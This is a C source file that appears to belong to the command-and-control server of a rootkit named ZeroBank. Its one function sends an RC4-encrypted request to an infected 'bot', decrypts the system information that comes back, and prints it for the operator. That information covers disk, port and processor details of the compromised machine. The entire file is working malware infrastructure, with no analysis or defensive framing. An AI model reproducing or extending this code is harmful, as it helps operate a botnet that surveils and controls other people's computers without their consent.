#include "server_globals.h"


BOOLEAN rootkit_get_sys_information(IN SOCKET sock, IN BYTE PacketType)
{
	INT sendsize = 0;
	INT recvsize = 0;
	ZEROBANK_PACKET_TYPE Packet = { 0 };
	PROOTKIT_SYS_INFORMATION sysinfo = NULL, entry = NULL;
	PVOID Out = NULL;
	char databuffer[255] = { 0 };
	char interfacebuffer[255] = { 0 };
	BOOLEAN ret;

	Packet.PacketType = PacketType;
	sendsize = send_packet_encrypted(sock, RC4_KEY_2, (PZEROBANK_PACKET_TYPE)&Packet, sizeof(ZEROBANK_PACKET_TYPE));
	if (sendsize > 0)
	{		
		Out = recv_decrypted(sock, RC4_KEY_2, (PROOTKIT_SYS_INFORMATION)entry, sizeof(ROOTKIT_SYS_INFORMATION));
		if (Out != NULL)
		{
			sysinfo = (PROOTKIT_SYS_INFORMATION)Out;
			if (sysinfo)
			{
				printf("\r\n/************ BOT_CONFIGURATION_MANAGER_INFORMATION *************");
				printf("\r\n");
				printf("\r\n[*] Number Of CdRoms: %lu", sysinfo->NumberOfCdRoms);
				printf("\r\n[*] Number Of Disks: %lu", sysinfo->NumberOfDisks);
				printf("\r\n[*] Number Of Floppies: %lu", sysinfo->NumberOfFloppies);
				printf("\r\n[*] Number Of Parallel Ports: %lu", sysinfo->NumberOfParallelPorts);
				printf("\r\n[*] Number Of Serial Ports: %lu", sysinfo->NumberOfSerialPorts);
				printf("\r\n[*] Number Of Scsi Ports: %lu", sysinfo->ScsiCount);
				printf("\r\n[*] Number Of Tape Drives: %lu", sysinfo->TapeDrivesCount);
				printf("\r\n");
				printf("\r\n************ BOT_PROCESSOR_MANAGER_INFORMATION **************");
				printf("\r\n");
				printf("\r\n[*] Ke Active Group Count: %lu", sysinfo->ActiveGroupCount);
				printf("\r\n[*] Ke Active Processors: %lu", (ULONG)sysinfo->ActiveProcessors);
				printf("\r\n[*] Ke Active Processors Count: %lu", sysinfo->ActiveProcessorsCount);
				printf("\r\n[*] Ke Max Processor Count: %lu", sysinfo->MaximunProcessorCount);
				printf("\r\n[*] Ke Interrupt Time: %ld", sysinfo->InterruptTime);

				ret = TRUE;
			}
		}
		else
		{
			printf("\r\n[!] Error allocating and decrypting data: %d", RtlGetLastWin32Error());
			ret = FALSE;
		}

	}
	else
	{
		printf("\r\n[!] Error sending packet type: %d", RtlGetLastWin32Error());
		ret = FALSE;
	}

	return ret;
}